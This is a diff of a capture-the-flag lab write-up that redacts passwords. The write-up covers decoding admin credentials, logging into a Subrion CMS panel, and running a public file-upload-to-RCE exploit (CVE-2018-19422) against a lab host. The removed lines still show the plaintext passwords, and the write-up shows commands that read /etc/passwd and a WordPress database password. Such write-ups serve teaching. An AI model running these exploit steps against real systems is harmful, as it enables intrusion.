@@ -97,25 +97,25 @@ GOALS
 IMP
 ===
 Subrion creds
-|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
+|->admin:<redacted> [cooked with magical formula]
 Wordpress creds
 |->
 ```
  {: file="enter.txt" }
 
 Copying what looks like the an encoded or hashed password. Using hashid on the strintg we get a "[+] Unknown hash" message. Reading the "cooked with magical formula" note leads me to believe it is a clue to use the [Cyberchef](https://gchq.github.io/CyberChef/) and use the "Magic" recipe.
-This leads it to string being decoded as "Scam2021".
+This leads it to string being decoded.
 
 Great we have a user name and password for the subrion website. According to the comments though it does not work and they need to fix it. But it appears we can fix it if we use the panel. Going to the website http://10.10.21.67/subrion yields nothing. But going to http://10.10.21.67/subrion/panel we are preseted with a login page for subrion and the CMS version number is 4.2.1.
 ![Subrion Login Page](subrion-panel-login.png)
-We can use the username of admin and the password Scam2021 to verify that it works and it allows us to login.
+We can use the username of admin and the decoded password to verify that it works and it allows us to login.
 Using searchsploit with the terms subrion we can see that our verision has an arbitrary file upload. This could allow use to upload either a web shell or reverse shell file to compromise the target.
 
 Luckily the python script from searchsploit will do this for us and give us a semi interactive shell.
 ```shell
 searchsploit -m 49876
 
-python3 49876.py --url http://10.10.21.67/subrion/panel/ --user admin --passw Scam2021
+python3 49876.py --url http://10.10.21.67/subrion/panel/ --user admin --passw <redacted>
 
 [+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
 
@@ -165,7 +165,7 @@ define( 'DB_NAME', 'wpdb' );
 define( 'DB_USER', 'support' );
 
 /** MySQL database password */
-define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
+define( 'DB_PASSWORD', '<redacted>' );
 
 /** MySQL hostname */
 define( 'DB_HOST', 'localhost' );
@@ -192,7 +192,7 @@ Let see what other users are on the machine by catting out /etc/passwd and grepp
 ```shell
 cat /etc/passwd | grep sh
 ```
-We see two users root and scamsite. Lets check out scamsite's home directory.
+We see two users root and site. Lets check out scamsite's home directory.
 ```plaintext
 root:x:0:0:root:/root:/bin/bash
 scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
